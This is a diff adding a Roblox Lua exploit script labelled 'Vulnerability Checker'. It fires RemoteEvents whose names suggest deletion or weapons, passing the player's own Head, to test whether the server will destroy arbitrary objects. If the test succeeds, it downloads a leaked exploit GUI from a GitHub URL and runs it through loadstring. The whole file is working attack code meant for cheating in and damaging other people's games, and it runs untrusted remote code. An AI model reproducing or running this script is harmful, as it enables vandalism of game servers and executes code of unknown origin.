@@ -1,0 +1,55 @@
+local StarterGui = game:GetService("StarterGui")
+local showNotification = true
+
+function Notify(tl, t, d) 
+	if showNotification == true then
+		StarterGui:SetCore("SendNotification", {
+			Title = tl;
+			Text = t;
+			Duration = d;
+		})
+	end
+end
+
+
+local remote = "nil"
+local found = false
+local enable = false
+local sent = false
+local LocalPlayer = game:GetService("Players").LocalPlayer
+local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
+
+local checkIn = {"Workspace", "ReplicatedStorage"}
+local names = {"Delete", "Remove", "Destroy", "Clean", "Clear","Bullet", "Bala", "Shoot", "Shot", "Fire", "Segway", "Handless", "Sword", "Attack", "Despawn", "Deletar", "Apagar"}
+if char then
+	Notify("Vulnerability Checker", "Looking up for remotes, may take a while.", 3)
+	for _, service in pairs(checkIn) do
+		for i,v in pairs(game:GetService(service):GetDescendants()) do
+			for _, str in pairs(names) do
+				if string.match(v.Name, str) and v:IsA("RemoteEvent") then
+					print("Checking " .. v.Name .. " from " .. service .. " service from " .. str .. " category")
+					local success, error = pcall(function()
+						v:FireServer(LocalPlayer.Character.Head)
+						found = true
+					end)
+					if success then
+						remote = v
+					end 
+					wait(0.5)
+					if not char:FindFirstChild("Head") then
+						enable = true
+						sent = true
+					end
+				end
+			end
+		end
+	end
+end
+
+if sent == false then
+	Notify("Vulnerability Checker", "This game is not vulnerable/supported.", 5)
+end
+
+if sent == true then
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/JxcExploit/Harkedv2-script/main/Leaked-v2hardked"))()
+end
